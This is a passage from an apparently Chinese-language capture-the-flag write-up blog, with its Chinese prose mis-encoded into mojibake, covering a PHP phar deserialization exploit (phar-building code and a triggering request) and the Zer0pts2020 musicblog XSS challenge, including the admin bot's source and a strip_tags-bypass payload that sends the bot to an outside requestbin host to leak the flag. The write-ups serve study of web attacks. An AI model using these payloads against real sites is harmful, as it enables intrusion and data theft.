$a=new PclZip(&amp;quot;/var/www/html/data/attachment/brand/1.zip&amp;quot;);//åŽ‹ç¼©çš„æ–‡ä»¶è·¯å¾„
echo serialize($a);
$phar = new Phar(&amp;quot;phar.phar&amp;quot;);
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;);
$phar-&amp;gt;setMetadata($a);
$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;m0c1nu7&amp;quot;);
$phar-&amp;gt;stopBuffering();
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;a href="http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt">http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt&lt;/a>&lt;/p>
&lt;p>ä¹‹åŽè§¦å‘pharååºåˆ—åŒ–&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /admin.php?mod=moban&amp;amp;act=del&amp;amp;token=709991a77ab3f79e5dcad72d0453978e&amp;amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt
Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban
&lt;/code>&lt;/pre>&lt;p>è¿™é‡Œéœ€è¦ä¼ å…¥csrfçš„tokenï¼ˆpostä¸Šä¼ å¤„å¯ä»¥æ‹¿åˆ°ï¼‰ï¼Œè¿˜éœ€è¦è®¾ç½®ä¸€ä¸‹Referer&lt;/p>
&lt;p>flag{9085d530-559f-49bd-9e0e-718780146bd3}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
*[Zer0pts2020]musicblog
&lt;/h4>
&lt;/summary>
&lt;p>æ³¨å†Œè´¦å·å¹¶ç™»å…¥ï¼Œå¯ä»¥åˆ›å»ºpostï¼Œå‹¾é€‰publishå¯ä»¥æœ‰adminè®¿é—®ï¼Œè¿™è‚¯å®šæ˜¯ä¸ªxssç±»çš„é¢˜ç›®äº†&lt;/p>
&lt;p>æ•´ä¸ªç«™æœ‰æ¯”è¾ƒå®Œå–„çš„cspè§„åˆ™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180148197.png" alt="image-20220119180148197">&lt;/p>
&lt;p>çœ‹ä¸‹worker.jsçš„å·¥ä½œé€»è¾‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Redis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ioredis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">admin_username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">admin_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;zer0pts{M4sh1m4fr3sh!!}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser_option&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">executablePath&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;google-chrome-unstable&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-background-networking&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-default-apps&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-extensions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-gpu&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-sync&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--disable-translate&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--hide-scrollbars&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--metrics-recording-only&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--mute-audio&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--no-first-run&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;--safebrowsing-disable-auto-update&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crawl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Query! (&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setUserAgent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;networkidle0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#like&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Done! (&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">init&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">browser_option&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Setting up...`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`http://challenge/login.php`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#username&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">admin_username&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#password&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#password&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">admin_password&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#login-submit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">$eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#login-submit&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">elem&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">elem&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">()),&lt;/span>
&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">evaluate&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;href=&amp;#34;posts.php&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Login failed at &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Setup done!`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[-] Error while setting up :(`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">evaluate&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`body: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] handle&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">blpop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;query&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://challenge/post.php?id=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// handle next
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// first ignite
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°æœ‰flagï¼Œè‚¯å®šæ˜¯è¦xssæ‹¿åˆ°ï¼›adminä¼šå…ˆç™»å…¥adminè´¦å·ï¼ŒæŽ¥ç€crawl()è®¿é—®url&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setUserAgent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;networkidle0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#like&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šç‚¹å‡»é¡µé¢çš„&lt;code>#like&lt;/code>ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢åˆ›å»ºPostæ—¶å‹¾é€‰çš„æ¡†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180603461.png" alt="image-20220119180603461">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180442910.png" alt="image-20220119180442910">&lt;/p>
&lt;p>æ³¨æ„åˆ°å®ƒå¯¹æ ‡ç­¾çš„è¿‡æ»¤ï¼Œä½†æ˜¯å…è®¸&lt;code>&amp;lt;audio&amp;gt;&lt;/code>çš„å­˜åœ¨&lt;/p>
&lt;p>æŸ¥èµ„æ–™å¯çŸ¥&lt;code>strip_tags&lt;/code>æœ‰å®‰å…¨é—®é¢˜ï¼Œå®ƒä¸ä¼šè¿‡æ»¤&lt;code>&amp;lt;a/udio&amp;gt;&lt;/code>æ ‡ç­¾ï¼Œå¹¶ä¸”&lt;code>&amp;lt;a/udio&amp;gt;&lt;/code>ä¼šä½œä¸ºè¶…é“¾æŽ¥&lt;code>&amp;lt;a&amp;gt;&lt;/code>è¢«è§£æžï¼ŒåŒæ—¶è¶…é“¾æŽ¥çš„è·³è½¬æ˜¯ä¸å—cspçš„æŽ§åˆ¶çš„ï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;a/udio id=like href=&amp;quot;http://http.requestbin.buuoj.cn/v4c4pyv4&amp;quot;&amp;gt;aa&amp;lt;/a/udio&amp;gt;
&lt;/code>&lt;/pre>&lt;p>buuæ”¹k8sä¹‹åŽå†…ç½‘çš„é¢˜å¤šå°‘æœ‰ç‚¹é—®é¢˜ï¼Œä¸€ç›´æ‹¿ä¸åˆ°flagï¼Œå¯„&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[FireshellCTF2020]Cars
&lt;/h4>
&lt;/summary>
